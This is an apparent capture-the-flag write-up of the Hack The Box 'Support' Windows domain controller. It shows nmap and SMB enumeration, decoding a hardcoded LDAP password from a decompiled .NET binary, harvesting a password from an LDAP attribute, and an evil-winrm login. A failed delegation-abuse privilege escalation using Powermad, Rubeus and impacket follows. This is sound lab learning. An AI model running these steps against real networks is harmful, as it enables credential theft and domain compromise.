```
sudo nmap -sS -sV -p- 10.10.11.174
[sudo] password for wizardwalter: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-20 19:49 EDT
Nmap scan report for 10.10.11.174
Host is up (0.027s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-21 00:10:47Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Doesnt look like there is a webserver, but i do see ldap:
```
ldapsearch -x -H ldap://10.10.11.174 -s base -LLL
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=support,DC=htb
ldapServiceName: support.htb:dc$@SUPPORT.HTB
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedControl: 1.2.840.113556.1.4.2309
supportedControl: 1.2.840.113556.1.4.2330
supportedControl: 1.2.840.113556.1.4.2354
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=support,DC=htb
serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configurat
 ion,DC=support,DC=htb
schemaNamingContext: CN=Schema,CN=Configuration,DC=support,DC=htb
namingContexts: DC=support,DC=htb
namingContexts: CN=Configuration,DC=support,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=support,DC=htb
namingContexts: DC=DomainDnsZones,DC=support,DC=htb
namingContexts: DC=ForestDnsZones,DC=support,DC=htb
isSynchronized: TRUE
highestCommittedUSN: 86091
dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN
 =Sites,CN=Configuration,DC=support,DC=htb
dnsHostName: dc.support.htb
defaultNamingContext: DC=support,DC=htb
currentTime: 20250821001701.0Z
configurationNamingContext: CN=Configuration,DC=support,DC=htb
```

DC is `support.htb`

i also see smb is open port 445, 135, etc:
- **445/tcp** → SMB over TCP (a.k.a. CIFS). This is the main one today.
    
- **139/tcp** → NetBIOS Session Service (legacy SMB over NetBIOS).
    
- **137/udp** → NetBIOS Name Service.
    
- **138/udp** → NetBIOS Datagram Service.
    
- **135/tcp** → **MSRPC Endpoint Mapper** (not SMB), but commonly open on Windows and used by many
```
smbclient -N -L //10.10.11.174                                    

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share 
```

that support-tools one stands out for sure, lets see if we can anonymously get in there:
```
smbclient -N //10.10.11.174/support-tools
Try "help" to get a list of possible commands.
smb: \>
```

bingo!

I find a list of exe files, one that sticks out is the `UserInfo.exe.zip`, I will download that to my kali machine and take a look.

Inside there are a bunch of dll files as well as but lets look at the exe:

i will run this to see if any hardcoded passwords or creds are in here:
`strings -n 6 UserInfo.exe | grep -i -E 'ldap|password|bind|uid|cn'`

didnt return anything handy.... 

lets actually decode this exe file:
```
wget -O AvaloniaILSpy.zip \
  https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip

unzip and then unzip IlSpy in AvaloniaILSpy dir

./ILSpy 
```

Now that we have ILSpy finally working(took me quite the trial and error ugh):
after going through the .net code i finally found a hidden gem! Under LDAP Query:
```


// UserInfo.Services.Protected
using System;
using System.Text;

internal class Protected
{
	private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

	private static byte[] key = Encoding.ASCII.GetBytes("armando");

	public static string getPassword()
	{
		byte[] array = Convert.FromBase64String(enc_password);
		byte[] array2 = array;
		for (int i = 0; i < array.Length; i++)
		{
			array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
		}
		return Encoding.Default.GetString(array2);
	}
}

```
wow what a find!
So looks like that string is encoded with key armando... lets decode and get the cleartext pass:
Ill use this quick powershell script to reverse engineer it:
Make sure you run pwsh:
```
$enc = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
$key = [Text.Encoding]::ASCII.GetBytes("armando")
$bytes = [Convert]::FromBase64String($enc)
for ($i=0; $i -lt $bytes.Length; $i++) {
  $bytes[$i] = ($bytes[$i] -bxor $key[$i % $key.Length]) -bxor 0xDF
}
[Text.Encoding]::GetEncoding(1252).GetString($bytes)
```

and the resultssss:
`nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

Nice, now we should in theory be able to auth to ldap and get further into the system... i kept looking into the code as if i try to run program i get a connect error so lets cut this out of the middle and try our own logic here that follows the below:
```


// UserInfo.Services.LdapQuery
using System;
using System.Collections;
using System.DirectoryServices;
using UserInfo.Services;

internal class LdapQuery
{
	private DirectoryEntry entry;

	private DirectorySearcher ds;

	public LdapQuery()
	{
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		string password = Protected.getPassword();
		entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
		entry.set_AuthenticationType((AuthenticationTypes)1);
		ds = new DirectorySearcher(entry);
	}

	public void query(string first, string last, bool verbose = false)
	{
		//IL_011e: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (first == null && last == null)
			{
				Console.WriteLine("[-] At least one of -first or -last is required.");
				return;
			}
			string text = ((last == null) ? ("(givenName=" + first + ")") : ((first != null) ? ("(&(givenName=" + first + ")(sn=" + last + "))") : ("(sn=" + last + ")")));
			if (verbose)
			{
				Console.WriteLine("[*] LDAP query to use: " + text);
			}
			ds.set_Filter(text);
			ds.get_PropertiesToLoad().Add("sAMAccountName");
			SearchResultCollection val = ds.FindAll();
			if (val.get_Count() == 0)
			{
				Console.WriteLine("[-] No users identified with that query.");
				return;
			}
			if (verbose)
			{
				string text2 = "[+] Found " + val.get_Count() + " result";
				if (val.get_Count() > 1)
				{
					text2 += "s";
				}
				text2 += ":";
				Console.WriteLine(text2);
			}
			foreach (SearchResult item in val)
			{
				if (verbose)
				{
					Console.Write("       ");
				}
				Console.WriteLine(item.get_Properties().get_Item("sAMAccountName").get_Item(0));
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("[-] Exception: " + ex.Message);
		}
	}

	public void printUser(string username, bool verbose = false)
	{
		try
		{
			if (verbose)
			{
				Console.WriteLine("[*] Getting data for " + username);
			}
			ds.set_Filter("sAMAccountName=" + username);
			ds.get_PropertiesToLoad().Add("pwdLastSet");
			ds.get_PropertiesToLoad().Add("lastLogon");
			ds.get_PropertiesToLoad().Add("givenName");
			ds.get_PropertiesToLoad().Add("sn");
			ds.get_PropertiesToLoad().Add("mail");
			SearchResult val = ds.FindOne();
			if (val == null)
			{
				Console.WriteLine("[-] Unable to locate " + username + ". Please try the find command to get the user's username.");
				return;
			}
			if (((ReadOnlyCollectionBase)(object)val.get_Properties().get_Item("givenName")).Count > 0)
			{
				Console.WriteLine("First Name:           " + val.get_Properties().get_Item("givenName").get_Item(0));
			}
			if (((ReadOnlyCollectionBase)(object)val.get_Properties().get_Item("sn")).Count > 0)
			{
				Console.WriteLine("Last Name:            " + val.get_Properties().get_Item("sn").get_Item(0));
			}
			if (((ReadOnlyCollectionBase)(object)val.get_Properties().get_Item("mail")).Count > 0)
			{
				Console.WriteLine("Contact:              " + val.get_Properties().get_Item("mail").get_Item(0));
			}
			if (val.get_Properties().Contains("pwdLastSet"))
			{
				Console.WriteLine("Last Password Change: " + DateTime.FromFileTime((long)val.get_Properties().get_Item("pwdLastSet").get_Item(0)));
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("[-] Exception: " + ex.Message);
		}
	}
}
```
 please make sure to add :
 `10.10.11.174 support.htb`
 to `/etc/hosts` as we know this is the name of the DC
next lets run ldapsearch now that we have creds:
```
U='support\ldap'
P='nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

well add these variables and then:
```
ldapsearch -H ldap://support.htb -x -D "$U" -w "$P" -b "" -s base -LLL defaultNamingContext
dn:
defaultNamingContext: DC=support,DC=htb
```

we get data back.... lets enum users:
```
ldapsearch -H ldap://support.htb -x -D "$U" -w "$P" -b DC=support,DC=htb -LLL \
  '(&(objectCategory=person)(objectClass=user))' sAMAccountName \
| awk '/^sAMAccountName:/{print $2}' | sort -u
```

```
Administrator
anderson.damian
bardot.mary
cromwell.gerard
daughtler.mabel
ford.victoria
Guest
hernandez.stanley
krbtgt
langley.lucy
ldap
levine.leopoldo
monroe.david
raven.clifton
smith.rosario
stoll.rachelle
support
thomas.raphael
west.laura
wilson.shelby
```

Support looks interesting!

```
ldapsearch -H ldap://support.htb -x -D "$U" -w "$P" -b DC=support,DC=htb -LLL \
  '(sAMAccountName=support)' '*'

dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z

# refldap://ForestDnsZones.support.htb/DC=ForestDnsZones,DC=support,DC=htb

# refldap://DomainDnsZones.support.htb/DC=DomainDnsZones,DC=support,DC=htb

# refldap://support.htb/CN=Configuration,DC=support,DC=htb
```

look at info field:
`info: Ironside47pleasure40Watchful`

little sketchy if you ask me :OMEGALUL:

i know port 5985(winrm) is open lets try to get in finally after all this!

```
evil-winrm -i 10.10.11.174 -u support -p Ironside47pleasure40Watchful

                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> cat ../Desktop/user.txt
3ebd82eb5df9eb272********
```

USER PWN!

---
### Priv Esc

```
*Evil-WinRM* PS C:\Users\support\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
SUPPORT\Shared Support Accounts            Group            S-1-5-21-1677581083-3380853377-188903654-1103 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

Shared support Accounts looks interesting lets look into it:
```
# --- edit these two ---
$Group   = 'SUPPORT\Shared Support Accounts'
$ObjectDN = 'CN=DC,OU=Domain Controllers,DC=support,DC=htb'
# ----------------------

([ADSI]"LDAP://$ObjectDN").psbase.ObjectSecurity.Access |
  Where-Object { $_.IdentityReference -eq $Group } |
  Select-Object IdentityReference, ActiveDirectoryRights, AccessControlType, IsInherited, ObjectType
```

```
IdentityReference     : SUPPORT\Shared Support Accounts
ActiveDirectoryRights : GenericAll
AccessControlType     : Allow
IsInherited           : False
ObjectType            : 00000000-0000-0000-0000-000000000000
```
Bang this is good!

```
$dn = ([ADSI]"LDAP://RootDSE").defaultNamingContext
*Evil-WinRM* PS C:\Users\support\Documents> ([ADSI]"LDAP://$dn")."ms-DS-MachineAccountQuota"
10
```

We want to add a machine to this, looks like we can add 10....

from kali:
```
impacket-addcomputer  'support.htb/support:Ironside47pleasure40Watchful' \
  -computer-name 'HACK$' -computer-pass 'P@ssw0rd!' -dc-ip 10.10.11.174
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account HACK$ with password P@ssw0rd!.
```

alright alright alright!!!!!


i checked but computer is not added...

taking a step back....
```
get-domainuser | select -first 1


logoncount             : 71
badpasswordtime        : 7/21/2022 4:03:43 AM
description            : Built-in account for administering the computer/domain
distinguishedname      : CN=Administrator,CN=Users,DC=support,DC=htb
objectclass            : {top, person, organizationalPerson, user}
lastlogontimestamp     : 8/22/2025 5:12:48 PM
name                   : Administrator
objectsid              : S-1-5-21-1677581083-3380853377-188903654-500
samaccountname         : Administrator
logonhours             : {255, 255, 255, 255...}
admincount             : 1
codepage               : 0
samaccounttype         : USER_OBJECT
accountexpires         : 12/31/1600 4:00:00 PM
countrycode            : 0
whenchanged            : 8/23/2025 12:12:48 AM
instancetype           : 4
objectguid             : e19ad196-8f3f-4b3b-931e-78c010470b97
lastlogon              : 8/22/2025 5:13:09 PM
lastlogoff             : 12/31/1600 4:00:00 PM
objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dscorepropagationdata  : {5/28/2022 11:19:47 AM, 5/28/2022 11:19:47 AM, 5/28/2022 11:03:44 AM, 1/1/1601 6:12:16 PM}
memberof               : {CN=Group Policy Creator Owners,CN=Users,DC=support,DC=htb, CN=Domain Admins,CN=Users,DC=support,DC=htb, CN=Enterprise Admins,CN=Users,DC=support,DC=htb, CN=Schema Admins,CN=Users,DC=support,DC=htb...}
whencreated            : 5/28/2022 11:01:56 AM
iscriticalsystemobject : True
badpwdcount            : 0
cn                     : Administrator
useraccountcontrol     : NORMAL_ACCOUNT
usncreated             : 8196
primarygroupid         : 513
pwdlastset             : 7/19/2022 10:55:56 AM
usnchanged             : 86053
```

now:
i have downloaded and uploaded:
```
PowerView.ps1
Powermad.ps1
```

these will help with the exploit
```
Import-Module .\Powermad.ps1
```


```
New-MachineAccount -MachineAccount 'FakeComputer' `
  -Password (ConvertTo-SecureString 'password1234' -AsPlainText -Force) `
  -Domain 'support.htb' -DomainController 'dc.support.htb'
[+] Machine account FakeComputer added
```

alright lets confirm this worked!

```
*Evil-WinRM* PS C:\Users\support\Documents> Import-Module .\PowerView.ps1
```

```
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer FakeComputer


pwdlastset             : 8/22/2025 6:34:14 PM
logoncount             : 0
badpasswordtime        : 12/31/1600 4:00:00 PM
distinguishedname      : CN=FakeComputer,CN=Computers,DC=support,DC=htb
objectclass            : {top, person, organizationalPerson, user...}
name                   : FakeComputer
objectsid              : S-1-5-21-1677581083-3380853377-188903654-5602
samaccountname         : FakeComputer$
localpolicyflags       : 0
codepage               : 0
samaccounttype         : MACHINE_ACCOUNT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 8/23/2025 1:34:14 AM
instancetype           : 4
usncreated             : 86109
objectguid             : 447bdf34-3476-405b-ba9a-f400ee33912c
lastlogon              : 12/31/1600 4:00:00 PM
lastlogoff             : 12/31/1600 4:00:00 PM
objectcategory         : CN=Computer,CN=Schema,CN=Configuration,DC=support,DC=htb
dscorepropagationdata  : 1/1/1601 12:00:00 AM
serviceprincipalname   : {RestrictedKrbHost/FakeComputer, HOST/FakeComputer, RestrictedKrbHost/FakeComputer.support.htb, HOST/FakeComputer.support.htb}
ms-ds-creatorsid       : {1, 5, 0, 0...}
badpwdcount            : 0
cn                     : FakeComputer
useraccountcontrol     : WORKSTATION_TRUST_ACCOUNT
whencreated            : 8/23/2025 1:34:14 AM
primarygroupid         : 515
iscriticalsystemobject : False
usnchanged             : 86111
dnshostname            : FakeComputer.support.htb
```

nice it is def there.....

need to take note of the SID of the newly create "computer":
`S-1-5-21-1677581083-3380853377-188903654-5602`

So:
Active Directory lets a _resource_ (the target computer object, T) decide **who is allowed to act on its behalf** for Kerberos constrained delegation. That allow-list lives in the attribute:

- **`msDS-AllowedToActOnBehalfOfOtherIdentity`** (call it “AOB” for short)
    

If you have **GenericAll** on T, you can **write** that attribute. Adding S’s **SID** into AOB tells the KDC: “S is allowed to obtain delegated tickets _to me (T)_ for other users.”

So with that being said we now:
```
upload ./Rubeus.exe 
```

```
.\Rubeus.exe hash /password:password1234 /user:FakeComputer /domain:support.htb

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4


[*] Action: Calculate Password Hash(es)

[*] Input password             : password1234
[*] Input username             : FakeComputer
[*] Input domain               : support.htb
[*] Salt                       : SUPPORT.HTBfakecomputer
[*]       rc4_hmac             : D4A1BE1776AD10DF103812B1A923CDE4
[*]       aes128_cts_hmac_sha1 : A378006C48C84F906F400C25BEA475B1
[*]       aes256_cts_hmac_sha1 : 19C4FB2A16DB178BC9201475BE3B61D7D8B0AB38CFC57260182F4A268BB58B1E
[*]       des_cbc_md5          : 8361A404262940BA

```

well use that rc4 hash:
```
\Rubeus.exe asktgt /user:$u /rc4:D4A1BE1776AD10DF103812B1A923CDE4 /domain:SUPPORT.HTB /dc:dc.support.htb /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4

[*] Action: Ask TGT

[*] Using rc4_hmac hash: D4A1BE1776AD10DF103812B1A923CDE4
[*] Building AS-REQ (w/ preauth) for: 'SUPPORT.HTB\FakeComputer$'

[X] KRB-ERROR (6) : KDC_ERR_C_PRINCIPAL_UNKNOWN

*Evil-WinRM* PS C:\Users\support\Documents> 
```


```
impacket-getST -spn cifs/dc.support.htb -impersonate Administrator \      
  'support.htb/FakeComputer$':'password1234' -dc-ip 10.10.11.174
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```
I have tried a lot and none are working... we move on

BOX pwned me :(